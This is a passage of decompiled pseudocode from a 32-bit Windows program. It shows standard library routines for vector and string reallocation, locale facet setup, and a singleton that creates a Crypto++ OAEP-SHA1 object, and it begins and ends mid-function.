  _DWORD *v24; // [esp+28h] [ebp-1Ch]
  _DWORD *v25; // [esp+2Ch] [ebp-18h]
  int v26; // [esp+30h] [ebp-14h]
  int *v27; // [esp+34h] [ebp-10h]
  int v28; // [esp+40h] [ebp-4h]

  v27 = &v17;
  v23 = a2;
  v20 = a3;
  v4 = *this;
  v26 = (a2 - *this) / 24;
  if ( (this[1] - v4) / 24 == 178956970 )
    sub_420130();
  v5 = (this[1] - v4) / 24 + 1;
  v19 = v5;
  v6 = (this[2] - v4) / 24;
  v7 = (unsigned int)((this[2] - v4) / 24) >> 1;
  if ( v6 <= 178956970 - v7 )
  {
    v8 = v7 + v6;
    if ( v7 + v6 < v5 )
      v8 = v5;
    v21 = v8;
  }
  else
  {
    v8 = v5;
    v21 = v5;
  }
  v9 = 24 * v8;
  v18 = 24 * v8;
  if ( v8 > 0xAAAAAAA )
  {
    v9 = -1;
LABEL_10:
    v10 = v9 + 35;
    if ( v9 + 35 <= v9 )
      v10 = -1;
    v11 = operator new(v10);
    if ( !v11 )
      goto LABEL_28;
    v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
    *(v12 - 1) = v11;
    goto LABEL_17;
  }
  if ( v9 >= 0x1000 )
    goto LABEL_10;
  if ( v9 )
  {
    v12 = operator new(24 * v8);
    v24 = v12;
    goto LABEL_18;
  }
  v12 = 0;
LABEL_17:
  v24 = v12;
LABEL_18:
  v22 = &v12[6 * v26];
  v26 = (int)(v22 + 6);
  v25 = v22 + 6;
  v28 = 0;
  sub_419530(v22, v20);
  v25 = v22;
  v13 = this[1];
  v14 = *this;
  if ( v23 == v13 )
  {
    sub_426E50(v14, v13, (int)v12);
  }
  else
  {
    sub_426E50(v14, v23, (int)v12);
    v25 = v12;
    sub_426E50(v23, this[1], v26);
  }
  v28 = -1;
  if ( *this )
  {
    sub_425130(*this, this[1]);
    v15 = (void *)*this;
    if ( (unsigned int)(24 * ((this[2] - *this) / 24)) < 0x1000 )
    {
LABEL_25:
      sub_46C87D(v15);
      v5 = v19;
      goto LABEL_26;
    }
    if ( (unsigned int)v15 - *((_DWORD *)v15 - 1) - 4 <= 0x1F )
    {
      v15 = (void *)*((_DWORD *)v15 - 1);
      goto LABEL_25;
    }
LABEL_28:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_26:
  *this = (int)v12;
  this[1] = (int)&v12[6 * v5];
  this[2] = (int)&v12[v18 / 4];
  return v22;
}
// 420130: using guessed type void __noreturn sub_420130(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00423EF0) --------------------------------------------------------
int sub_423EF0()
{
  int result; // eax
  int v1; // eax
  _DWORD *v2; // esi
  int v3; // eax

  if ( dword_4F1560 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_4F1560);
    if ( dword_4F1560 == -1 )
    {
      _Mtx_init_in_situ((_Mtx_t)&unk_4F1570, 2);
      atexit(sub_4B75B0);
      _Init_thread_footer(&dword_4F1560);
    }
  }
  result = dword_4F155C;
  if ( !dword_4F155C )
  {
    v1 = _Mtx_lock((_Mtx_t)&unk_4F1570);
    if ( v1 )
      std::_Throw_C_error(v1);
    v2 = (_DWORD *)dword_4F155C;
    if ( !dword_4F155C )
    {
      v2 = operator new(4u);
      *v2 = &CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>::`vftable';
      dword_4F155C = (int)v2;
    }
    v3 = _Mtx_unlock((_Mtx_t)&unk_4F1570);
    if ( v3 )
      std::_Throw_C_error(v3);
    return (int)v2;
  }
  return result;
}
// 469BC5: using guessed type void __cdecl std::_Throw_C_error(_DWORD);
// 46C388: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 46C3D2: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BB09C: using guessed type void *CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>::`vftable';
// 4F155C: using guessed type int dword_4F155C;
// 4F1560: using guessed type int dword_4F1560;

//----- (00424000) --------------------------------------------------------
void **__thiscall sub_424000(void **Src, unsigned int a2, int a3)
{
  char *v4; // esi
  unsigned int v5; // eax
  unsigned int v6; // esi
  unsigned int v7; // eax
  unsigned int v8; // ecx
  unsigned int v9; // edx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // edi
  void *v13; // esi
  size_t v15; // [esp-4h] [ebp-1Ch]
  char *v16; // [esp+Ch] [ebp-Ch]
  unsigned int v17; // [esp+10h] [ebp-8h]
  unsigned int v18; // [esp+14h] [ebp-4h]

  v4 = (char *)Src[4];
  v16 = v4;
  if ( 2147483646 - (int)v4 < a2 )
    sub_4257D0();
  v5 = (unsigned int)Src[5];
  v17 = (unsigned int)&v4[a2];
  v6 = v17 | 7;
  v18 = v5;
  if ( (v17 | 7) <= 0x7FFFFFFE )
  {
    if ( v5 <= 2147483646 - (v5 >> 1) )
    {
      v7 = (v5 >> 1) + v5;
      if ( v6 < v7 )
        v6 = v7;
    }
    else
    {
      v6 = 2147483646;
    }
  }
  else
  {
    v6 = 2147483646;
  }
  v8 = __CFADD__(v6, 1) ? -1 : v6 + 1;
  v9 = 2 * v8;
  if ( v8 <= 0x7FFFFFFF )
  {
    if ( v9 < 0x1000 )
    {
      if ( v9 )
        v12 = operator new(2 * v8);
      else
        v12 = 0;
      goto LABEL_18;
    }
  }
  else
  {
    v9 = -1;
  }
  v10 = v9 + 35;
  if ( v9 + 35 <= v9 )
    v10 = -1;
  v11 = operator new(v10);
  if ( !v11 )
    goto LABEL_25;
  v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
  *(v12 - 1) = v11;
LABEL_18:
  Src[4] = (void *)v17;
  Src[5] = (void *)v6;
  v15 = 2 * (_DWORD)v16 + 2;
  if ( v18 >= 8 )
  {
    v13 = *Src;
    memmove(v12, *Src, v15);
    if ( 2 * v18 + 2 < 0x1000 )
    {
LABEL_22:
      sub_46C87D(v13);
      *Src = v12;
      return Src;
    }
    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )
    {
      v13 = (void *)*((_DWORD *)v13 - 1);
      goto LABEL_22;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v12, Src, v15);
  *Src = v12;
  return Src;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00424140) --------------------------------------------------------
void **__thiscall sub_424140(void **Src, int a2, int a3, __int16 a4)
{
  char *v5; // edx
  unsigned int v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // edi
  unsigned int v9; // ecx
  unsigned int v10; // edx
  size_t v11; // eax
  void *v12; // eax
  _DWORD *v13; // esi
  int v14; // edi
  void *v15; // edi
  int v16; // ecx
  void **result; // eax
  void *v18; // [esp+Ch] [ebp-Ch]
  unsigned int v19; // [esp+10h] [ebp-8h]
  char *v20; // [esp+14h] [ebp-4h]

  v5 = (char *)Src[4];
  v20 = v5;
  if ( v5 == (char *)2147483646 )
    sub_4257D0();
  v6 = (unsigned int)(v5 + 1);
  v7 = (unsigned int)Src[5];
  v18 = (void *)v6;
  v8 = v6 | 7;
  v19 = v7;
  if ( (v6 | 7) <= 0x7FFFFFFE )
  {
    if ( v7 <= 2147483646 - (v7 >> 1) )
    {
      if ( v8 < v7 + (v7 >> 1) )
        v8 = v7 + (v7 >> 1);
    }
    else
    {
      v8 = 2147483646;
    }
  }
  else
  {
    v8 = 2147483646;
  }
  v9 = __CFADD__(v8, 1) ? -1 : v8 + 1;
  v10 = 2 * v9;
  if ( v9 <= 0x7FFFFFFF )
  {
    if ( v10 < 0x1000 )
    {
      if ( v10 )
        v13 = operator new(2 * v9);
      else
        v13 = 0;
      goto LABEL_18;
    }
  }
  else
  {
    v10 = -1;
  }
  v11 = v10 + 35;
  if ( v10 + 35 <= v10 )
    v11 = -1;
  v12 = operator new(v11);
  if ( !v12 )
    goto LABEL_25;
  v13 = (_DWORD *)(((unsigned int)v12 + 35) & 0xFFFFFFE0);
  *(v13 - 1) = v12;
LABEL_18:
  Src[5] = (void *)v8;
  Src[4] = v18;
  v14 = 2 * (_DWORD)v20;
  if ( v19 >= 8 )
  {
    v15 = *Src;
    memmove(v13, *Src, 2 * (_DWORD)v20);
    v16 = 2 * (_DWORD)v20;
    *(_WORD *)((char *)v13 + v16) = a4;
    *(_WORD *)((char *)v13 + v16 + 2) = 0;
    if ( 2 * v19 + 2 < 0x1000 )
    {
LABEL_22:
      sub_46C87D(v15);
      *Src = v13;
      return Src;
    }
    if ( (unsigned int)v15 - *((_DWORD *)v15 - 1) - 4 <= 0x1F )
    {
      v15 = (void *)*((_DWORD *)v15 - 1);
      goto LABEL_22;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v13, Src, 2 * (_DWORD)v20);
  *(_WORD *)((char *)v13 + v14) = a4;
  *(_WORD *)((char *)v13 + v14 + 2) = 0;
  result = Src;
  *Src = v13;
  return result;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (004242A0) --------------------------------------------------------
void **__thiscall sub_4242A0(void **Src, unsigned int a2, int a3, const void *a4, int a5)
{
  char *v6; // esi
  unsigned int v7; // edx
  unsigned int v8; // edi
  unsigned int v9; // ecx
  unsigned int v10; // edx
  size_t v11; // eax
  void *v12; // eax
  _DWORD *v13; // esi
  void *v14; // edi
  void **result; // eax
  size_t v16; // [esp-4h] [ebp-24h]
  unsigned int v17; // [esp+14h] [ebp-Ch]
  char *v18; // [esp+18h] [ebp-8h]
  char *v19; // [esp+18h] [ebp-8h]
  char *v20; // [esp+1Ch] [ebp-4h]
  _WORD *v21; // [esp+1Ch] [ebp-4h]

  v6 = (char *)Src[4];
  v20 = v6;
  if ( 2147483646 - (int)v6 < a2 )
    sub_4257D0();
  v7 = (unsigned int)Src[5];
  v18 = &v6[a2];
  v8 = (unsigned int)&v6[a2] | 7;
  v17 = v7;
  if ( v8 <= 0x7FFFFFFE )
  {
    if ( v7 <= 2147483646 - (v7 >> 1) )
    {
      if ( v8 < v7 + (v7 >> 1) )
        v8 = v7 + (v7 >> 1);
    }
    else
    {
      v8 = 2147483646;
    }
  }
  else
  {
    v8 = 2147483646;
  }
  v9 = __CFADD__(v8, 1) ? -1 : v8 + 1;
  v10 = 2 * v9;
  if ( v9 <= 0x7FFFFFFF )
  {
    if ( v10 < 0x1000 )
    {
      if ( v10 )
        v13 = operator new(2 * v9);
      else
        v13 = 0;
      goto LABEL_18;
    }
  }
  else
  {
    v10 = -1;
  }
  v11 = v10 + 35;
  if ( v10 + 35 <= v10 )
    v11 = -1;
  v12 = operator new(v11);
  if ( !v12 )
    goto LABEL_25;
  v13 = (_DWORD *)(((unsigned int)v12 + 35) & 0xFFFFFFE0);
  *(v13 - 1) = v12;
LABEL_18:
  Src[4] = v18;
  Src[5] = (void *)v8;
  v19 = (char *)v13 + 2 * (_DWORD)v20;
  v16 = 2 * (_DWORD)v20;
  v21 = (_WORD *)v13 + (_DWORD)&v20[a5];
  if ( v17 >= 8 )
  {
    v14 = *Src;
    memmove(v13, *Src, v16);
    memmove(v19, a4, 2 * a5);
    *v21 = 0;
    if ( 2 * v17 + 2 < 0x1000 )
    {
LABEL_22:
      sub_46C87D(v14);
      *Src = v13;
      return Src;
    }
    if ( (unsigned int)v14 - *((_DWORD *)v14 - 1) - 4 <= 0x1F )
    {
      v14 = (void *)*((_DWORD *)v14 - 1);
      goto LABEL_22;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v13, Src, v16);
  memmove(v19, a4, 2 * a5);
  *v21 = 0;
  result = Src;
  *Src = v13;
  return result;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00424420) --------------------------------------------------------
_DWORD *__cdecl sub_424420(int a1)
{
  unsigned int v1; // edi
  int v2; // ebx
  int v3; // ecx
  _DWORD *v4; // esi
  int v5; // eax
  int v6; // ecx
  const char *v7; // eax
  char v9[52]; // [esp+10h] [ebp-54h] BYREF
  int v10; // [esp+44h] [ebp-20h]
  int v11; // [esp+48h] [ebp-1Ch]
  char v12[4]; // [esp+4Ch] [ebp-18h] BYREF
  _DWORD *v13; // [esp+50h] [ebp-14h] BYREF
  int v14; // [esp+60h] [ebp-4h]

  v10 = a1;
  v11 = 0;
  std::_Lockit::_Lockit((std::_Lockit *)v12, 0);
  v14 = 0;
  v1 = dword_4F15A8;
  v2 = dword_4F152C;
  if ( !dword_4F15A8 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)&v13, 0);
    LOBYTE(v14) = 1;
    if ( !dword_4F15A8 )
      dword_4F15A8 = ++dword_4F0338;
    LOBYTE(v14) = 0;
    std::_Lockit::~_Lockit((std::_Lockit *)&v13);
    v1 = dword_4F15A8;
  }
  v3 = *(_DWORD *)(a1 + 4);
  if ( v1 >= *(_DWORD *)(v3 + 12) )
  {
    v4 = 0;
  }
  else
  {
    v4 = *(_DWORD **)(*(_DWORD *)(v3 + 8) + 4 * v1);
    if ( v4 )
      goto LABEL_20;
  }
  if ( !*(_BYTE *)(v3 + 20) )
    goto LABEL_12;
  v5 = sub_469E47();
  if ( v1 < *(_DWORD *)(v5 + 12) )
  {
    v4 = *(_DWORD **)(*(_DWORD *)(v5 + 8) + 4 * v1);
LABEL_12:
    if ( v4 )
      goto LABEL_20;
  }
  if ( v2 )
  {
    v4 = (_DWORD *)v2;
  }
  else
  {
    v4 = operator new(8u);
    v13 = v4;
    LOBYTE(v14) = 2;
    v6 = *(_DWORD *)(v10 + 4);
    if ( v6 )
    {
      v7 = *(const char **)(v6 + 24);
      if ( !v7 )
        v7 = (const char *)(v6 + 28);
    }
    else
    {
      v7 = (const char *)&unk_4CCC25;
    }
    sub_401AF0((int)v9, v7);
    *v4 = &std::_Facet_base::`vftable';
    *v4 = &std::locale::facet::`vftable';
    v4[1] = 0;
    *v4 = &std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
    v14 = 0;
    v11 = 0;
    sub_401BC0((int)v9);
    v13 = v4;
    LOBYTE(v14) = 7;
    std::_Facet_Register((struct std::_Facet_base *)v4);
    (*(void (__thiscall **)(_DWORD *))(*v4 + 4))(v4);
    dword_4F152C = (int)v4;
    v13 = 0;
    LOBYTE(v14) = 0;
  }
LABEL_20:
  v14 = -1;
  std::_Lockit::~_Lockit((std::_Lockit *)v12);
  return v4;
}
// 469AB6: using guessed type _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 469B0E: using guessed type void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 469E1B: using guessed type void __cdecl std::_Facet_Register(struct std::_Facet_base *);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4BE60C: using guessed type void *std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
// 4F0338: using guessed type int dword_4F0338;
// 4F152C: using guessed type int dword_4F152C;
// 4F15A8: using guessed type int dword_4F15A8;
// 424420: using guessed type char var_18[4];

//----- (004245E0) --------------------------------------------------------
_DWORD *__cdecl sub_4245E0(int a1)
{
  unsigned int v1; // edi
  int v2; // ebx
  int v3; // ecx
  _DWORD *v4; // esi
  int v5; // eax
  int v6; // ecx
  const char *v7; // eax
  char v9[52]; // [esp+10h] [ebp-54h] BYREF
  int v10; // [esp+44h] [ebp-20h]
  int v11; // [esp+48h] [ebp-1Ch]
  char v12[4]; // [esp+4Ch] [ebp-18h] BYREF
  _DWORD *v13; // [esp+50h] [ebp-14h] BYREF
  int v14; // [esp+60h] [ebp-4h]

  v10 = a1;
  v11 = 0;
  std::_Lockit::_Lockit((std::_Lockit *)v12, 0);
  v14 = 0;
  v1 = dword_4F1548;
  v2 = dword_4F1528;
  if ( !dword_4F1548 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)&v13, 0);
    LOBYTE(v14) = 1;
    if ( !dword_4F1548 )
      dword_4F1548 = ++dword_4F0338;
    LOBYTE(v14) = 0;
    std::_Lockit::~_Lockit((std::_Lockit *)&v13);
    v1 = dword_4F1548;
  }
  v3 = *(_DWORD *)(a1 + 4);
  if ( v1 >= *(_DWORD *)(v3 + 12) )
  {
    v4 = 0;
  }
  else
  {
    v4 = *(_DWORD **)(*(_DWORD *)(v3 + 8) + 4 * v1);
    if ( v4 )
      goto LABEL_20;
  }
  if ( !*(_BYTE *)(v3 + 20) )
    goto LABEL_12;
  v5 = sub_469E47();
  if ( v1 < *(_DWORD *)(v5 + 12) )
  {
    v4 = *(_DWORD **)(*(_DWORD *)(v5 + 8) + 4 * v1);
LABEL_12:
    if ( v4 )
      goto LABEL_20;
  }
  if ( v2 )
  {
    v4 = (_DWORD *)v2;
  }
  else
  {
    v4 = operator new(8u);
    v13 = v4;
    LOBYTE(v14) = 2;
    v6 = *(_DWORD *)(v10 + 4);
    if ( v6 )
    {
      v7 = *(const char **)(v6 + 24);
      if ( !v7 )
        v7 = (const char *)(v6 + 28);
    }
    else
    {
      v7 = (const char *)&unk_4CCC25;
    }
    sub_401AF0((int)v9, v7);
    *v4 = &std::_Facet_base::`vftable';
    *v4 = &std::locale::facet::`vftable';
    v4[1] = 0;
    *v4 = &std::codecvt_base::`vftable';
    *v4 = &std::codecvt<char,char,_Mbstatet>::`vftable';
    v14 = 0;
    v11 = 0;
    sub_401BC0((int)v9);
    v13 = v4;
    LOBYTE(v14) = 8;
    std::_Facet_Register((struct std::_Facet_base *)v4);
    (*(void (__thiscall **)(_DWORD *))(*v4 + 4))(v4);
    dword_4F1528 = (int)v4;
    v13 = 0;
    LOBYTE(v14) = 0;
  }
LABEL_20:
  v14 = -1;
  std::_Lockit::~_Lockit((std::_Lockit *)v12);
  return v4;
}
// 469AB6: using guessed type _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 469B0E: using guessed type void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 469E1B: using guessed type void __cdecl std::_Facet_Register(struct std::_Facet_base *);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4BBE24: using guessed type void *std::codecvt_base::`vftable';
// 4BBFE4: using guessed type void *std::codecvt<char,char,_Mbstatet>::`vftable';
// 4F0338: using guessed type int dword_4F0338;
// 4F1528: using guessed type int dword_4F1528;
// 4F1548: using guessed type int dword_4F1548;
// 4245E0: using guessed type char var_18[4];

//----- (004247B0) --------------------------------------------------------
_QWORD *__usercall sub_4247B0@<eax>(int a1@<ebp>, int a2)
{
  unsigned int v2; // edi
  int v3; // ecx
  _QWORD *v4; // esi
  int v5; // eax
  int v6; // ecx
  int v7; // ecx
  const char *v8; // eax
  int v9; // eax
  _BYTE v11[52]; // [esp-5Ch] [ebp-68h] BYREF
  int v12; // [esp-28h] [ebp-34h]
  int v13; // [esp-24h] [ebp-30h]
  int v14; // [esp-20h] [ebp-2Ch]
  int v15; // [esp-1Ch] [ebp-28h] BYREF
  _DWORD v16[5]; // [esp-18h] [ebp-24h] BYREF
  int v17; // [esp-4h] [ebp-10h]
  _DWORD v18[2]; // [esp+0h] [ebp-Ch] BYREF
  int v19; // [esp+8h] [ebp-4h] BYREF
  void *retaddr; // [esp+Ch] [ebp+0h]

  v18[0] = a1;
  v18[1] = retaddr;
  v17 = -1;
  v16[4] = &loc_4B12F0;
  v16[3] = NtCurrentTeb()->NtTib.ExceptionList;
  v16[2] = &v19;
  v12 = a2;
  v14 = 0;
  std::_Lockit::_Lockit((std::_Lockit *)&v15, 0);
  v17 = 0;
  v2 = dword_4F1544;
  v13 = dword_4F1518;
  if ( !dword_4F1544 )
  {
    std::_Lockit::_Lockit((std::_Lockit *)v16, 0);
    LOBYTE(v17) = 1;
    if ( !dword_4F1544 )
      dword_4F1544 = ++dword_4F0338;
    LOBYTE(v17) = 0;
    std::_Lockit::~_Lockit((std::_Lockit *)v16);
    v2 = dword_4F1544;
  }
  v3 = *(_DWORD *)(a2 + 4);
  if ( v2 >= *(_DWORD *)(v3 + 12) )
  {
    v4 = 0;
  }
  else
  {
    v4 = *(_QWORD **)(*(_DWORD *)(v3 + 8) + 4 * v2);
    if ( v4 )
      goto LABEL_20;
  }
  if ( !*(_BYTE *)(v3 + 20) )
    goto LABEL_12;
  v5 = sub_469E47();
  if ( v2 < *(_DWORD *)(v5 + 12) )
  {
    v4 = *(_QWORD **)(*(_DWORD *)(v5 + 8) + 4 * v2);
LABEL_12:
    if ( v4 )
      goto LABEL_20;
  }
  if ( v13 )
  {
    v4 = (_QWORD *)v13;
  }
  else
  {
    v4 = operator new(0x18u);
    v13 = (int)v4;
    LOBYTE(v17) = 2;
    v6 = v12;
    *(_OWORD *)v4 = 0i64;
    v4[2] = 0i64;
    v7 = *(_DWORD *)(v6 + 4);
    if ( v7 )
    {
      v8 = *(const char **)(v7 + 24);
      if ( !v8 )
        v8 = (const char *)(v7 + 28);
    }
    else
    {
      v8 = byte_4CCC25;
    }
    v9 = sub_401AF0((int)v11, v8);
    v14 = 1;
    *(_DWORD *)v4 = &std::_Facet_base::`vftable';
    *(_DWORD *)v4 = &std::locale::facet::`vftable';
    *((_DWORD *)v4 + 1) = 0;
    v17 = 5;
    *(_DWORD *)v4 = &std::numpunct<wchar_t>::`vftable';
    sub_4260B0((int)v4, (int)v18, v9, 1);
    v17 = 0;
    v14 = 0;
    sub_401BC0((int)v11);
    v16[0] = v4;
    LOBYTE(v17) = 7;
    std::_Facet_Register((struct std::_Facet_base *)v4);
    (*(void (__thiscall **)(_QWORD *))(*(_DWORD *)v4 + 4))(v4);
    dword_4F1518 = (int)v4;
    v16[0] = 0;
    LOBYTE(v17) = 0;
  }
LABEL_20:
  v17 = -1;
  std::_Lockit::~_Lockit((std::_Lockit *)&v15);
  return v4;
}
// 4247B0: could not find valid save-restore pair for ebp
// 469AB6: using guessed type _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 469B0E: using guessed type void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 469E1B: using guessed type void __cdecl std::_Facet_Register(struct std::_Facet_base *);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4BE63C: using guessed type void *std::numpunct<wchar_t>::`vftable';
// 4F0338: using guessed type int dword_4F0338;
// 4F1518: using guessed type int dword_4F1518;
// 4F1544: using guessed type int dword_4F1544;

//----- (004249A0) --------------------------------------------------------
_DWORD *__thiscall sub_4249A0(_DWORD *Src, unsigned int a2, int a3, unsigned int a4, unsigned __int16 a5)
{
  int v6; // edx
  int v7; // eax
  unsigned int v8; // edx
  unsigned int v9; // edi
  unsigned int v10; // ecx
  unsigned int v11; // edx
  size_t v12; // eax
  void *v13; // eax
  _DWORD *v14; // esi
  char *v15; // edi
  void *v16; // ebx
  char *v17; // edi
  int i; // ecx
  _DWORD *result; // eax
  unsigned int v20; // eax
  char *v21; // edi
  int j; // ecx
  size_t v23; // [esp-4h] [ebp-20h]
  int v25; // [esp+10h] [ebp-Ch]
  unsigned int v26; // [esp+14h] [ebp-8h]
  int v27; // [esp+18h] [ebp-4h]

  v6 = Src[4];
  v27 = v6;
  if ( 2147483646 - v6 < a2 )
    sub_4257D0();
  v7 = v6 + a2;
  v8 = Src[5];
  v25 = v7;
  v9 = v7 | 7;
  v26 = v8;
  if ( (v7 | 7u) <= 0x7FFFFFFE )
  {
    if ( v8 <= 2147483646 - (v8 >> 1) )
    {
      if ( v9 < v8 + (v8 >> 1) )
        v9 = v8 + (v8 >> 1);
    }
    else
    {
      v9 = 2147483646;
    }
  }
  else
  {
    v9 = 2147483646;
  }
  v10 = __CFADD__(v9, 1) ? -1 : v9 + 1;
  v11 = 2 * v10;
  if ( v10 <= 0x7FFFFFFF )
  {
    if ( v11 < 0x1000 )
    {
      if ( v11 )
        v14 = operator new(2 * v10);
      else
        v14 = 0;
      goto LABEL_18;
    }
  }
  else
  {
    v11 = -1;
  }
  v12 = v11 + 35;
  if ( v11 + 35 <= v11 )
    v12 = -1;
  v13 = operator new(v12);
  if ( !v13 )
    goto LABEL_34;
  v14 = (_DWORD *)(((unsigned int)v13 + 35) & 0xFFFFFFE0);
  *(v14 - 1) = v13;
LABEL_18:
  Src[4] = v25;
  Src[5] = v9;
  v23 = 2 * v27;
  v15 = (char *)v14 + 2 * v27;
  if ( v26 >= 8 )
  {
    v16 = (void *)*Src;
    memmove(v14, v16, v23);
    if ( a4 )
    {
      memset32(v15, (a5 << 16) | a5, a4 >> 1);
      v17 = &v15[4 * (a4 >> 1)];
      for ( i = a4 & 1; i; --i )
      {
        *(_WORD *)v17 = a5;
        v17 += 2;
      }
    }
    *((_WORD *)v14 + a4 + v27) = 0;
    if ( 2 * v26 + 2 < 0x1000 )
      goto LABEL_26;
    if ( (unsigned int)v16 - *((_DWORD *)v16 - 1) - 4 <= 0x1F )
    {
      v16 = (void *)*((_DWORD *)v16 - 1);
LABEL_26:
      sub_46C87D(v16);
      result = Src;
      *Src = v14;
      return result;
    }
LABEL_34:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v14, Src, v23);
  v20 = a4;
  if ( a4 )
  {
    memset32(v15, (a5 << 16) | a5, a4 >> 1);
    v21 = &v15[4 * (a4 >> 1)];
    for ( j = a4 & 1; j; --j )
    {
      *(_WORD *)v21 = a5;
      v21 += 2;
    }
    v20 = a4;
  }
  *((_WORD *)v14 + v20 + v27) = 0;
  result = Src;
  *Src = v14;
  return result;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00424B40) --------------------------------------------------------
void **__thiscall sub_424B40(void **Src, int a2, int a3, char a4)
{
  size_t v5; // edx
  unsigned int v6; // eax
  unsigned int v7; // edi
  unsigned int v8; // eax
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // esi
  _DWORD *v13; // eax
  void *v14; // edi
  void **result; // eax
  unsigned int v16; // [esp+Ch] [ebp-8h]
  size_t Size; // [esp+10h] [ebp-4h]

  v5 = (size_t)Src[4];
  Size = v5;
  if ( v5 == 0x7FFFFFFF )
    sub_4257D0();
  v6 = (unsigned int)Src[5];
  v7 = (v5 + 1) | 0xF;
  v16 = v6;
  if ( v7 <= 0x7FFFFFFF )
  {
    if ( v6 <= 0x7FFFFFFF - (v6 >> 1) )
    {
      v8 = (v6 >> 1) + v6;
      if ( v7 < v8 )
        v7 = v8;
    }
    else
    {
      v7 = 0x7FFFFFFF;
    }
  }
  else
  {
    v7 = 0x7FFFFFFF;
  }
  v9 = __CFADD__(v7, 1) ? -1 : v7 + 1;
  if ( v9 < 0x1000 )
  {
    if ( v9 )
    {
      v13 = operator new(__CFADD__(v7, 1) ? -1 : v7 + 1);
      v5 = Size;
      v12 = v13;
    }
    else
    {
      v12 = 0;
    }
  }
  else
  {
    v10 = v9 + 35;
    if ( v9 + 35 <= v9 )
      v10 = -1;
    v11 = operator new(v10);
    if ( !v11 )
      goto LABEL_23;
    v5 = Size;
    v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
    *(v12 - 1) = v11;
  }
  Src[4] = (void *)(v5 + 1);
  Src[5] = (void *)v7;
  if ( v16 >= 0x10 )
  {
    v14 = *Src;
    memmove(v12, *Src, v5);
    *((_BYTE *)v12 + Size) = a4;
    *((_BYTE *)v12 + Size + 1) = 0;
    if ( v16 + 1 < 0x1000 )
    {
LABEL_20:
      sub_46C87D(v14);
      *Src = v12;
      return Src;
    }
    if ( (unsigned int)v14 - *((_DWORD *)v14 - 1) - 4 <= 0x1F )
    {
      v14 = (void *)*((_DWORD *)v14 - 1);
      goto LABEL_20;
    }
LABEL_23:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove(v12, Src, v5);
  result = Src;
  *((_BYTE *)v12 + Size) = a4;
  *((_BYTE *)v12 + Size + 1) = 0;
  *Src = v12;
  return result;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00424C80) --------------------------------------------------------
const void **__thiscall sub_424C80(const void **Src, unsigned int a2, int a3, size_t Size, const void *a5, size_t a6)
{
  size_t v7; // edx
  unsigned int v8; // edi
  unsigned int v9; // esi
  unsigned int v10; // ecx
  size_t v11; // eax
  void *v12; // eax
  _DWORD *v13; // edi
  _DWORD *v14; // eax
  char *v15; // esi
  unsigned int v17; // [esp+14h] [ebp-Ch]
  void *v18; // [esp+18h] [ebp-8h]
  char *v19; // [esp+18h] [ebp-8h]
  size_t v20; // [esp+1Ch] [ebp-4h]
  size_t v21; // [esp+1Ch] [ebp-4h]

  v7 = (size_t)Src[4];
  v20 = v7;
  if ( 0x7FFFFFFF - v7 < a2 )
    sub_4257D0();
  v8 = (unsigned int)Src[5];
  v18 = (void *)(v7 + a2);
  v9 = (v7 + a2) | 0xF;
  v17 = v8;
  if ( v9 <= 0x7FFFFFFF )
  {
    if ( v8 <= 0x7FFFFFFF - (v8 >> 1) )
    {
      if ( v9 < v8 + (v8 >> 1) )
        v9 = v8 + (v8 >> 1);
    }
    else
    {
